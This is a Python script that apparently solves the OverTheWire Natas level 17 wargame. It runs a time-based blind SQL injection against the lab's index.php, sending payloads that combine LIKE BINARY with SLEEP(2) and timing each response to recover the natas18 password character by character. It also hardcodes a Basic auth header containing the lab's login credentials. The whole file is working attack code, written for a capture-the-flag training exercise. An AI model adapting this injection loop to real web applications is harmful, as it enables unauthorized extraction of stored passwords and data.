import requests, string
from time import time
base_url ="http://natas17.natas.labs.overthewire.org/index.php?username="
characters = ''.join([string.ascii_letters,string.digits])
auth_headers = {'Authorization': 'Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=='} 

done=False
passwd=''
passwd_len = len(passwd)
char = ''

def check(query):
    start = time()
    requests.get(base_url + query, headers=auth_headers)
    duration = time() - start
    print(' ',char, '---', duration)
    if(duration > 2):
        return True
    return False

while not done:
    for c in characters:
        char = c
        query=f'natas18" AND password LIKE BINARY "%{passwd}{c}%" AND SLEEP(2) AND "a"="a&debug'
        alt_query=f'natas18" AND password LIKE BINARY "%{c}{passwd}%" AND SLEEP(2) AND "a"="a&debug'
        if(check(query)):
            passwd += c
        elif(check(alt_query)):
            passwd = c + passwd

        if(check(f'natas18" and password LIKE BINARY "{passwd}" AND SLEEP(2) AND "a"="a&debug')):
            done = True
        elif(passwd_len != len(passwd)):
            passwd_len = len(passwd)
            print('\t', passwd)

print(f"PASSWORD: {passwd}")
# check(f'natas16" and password LIKE BINARY "{passwd}&debug')
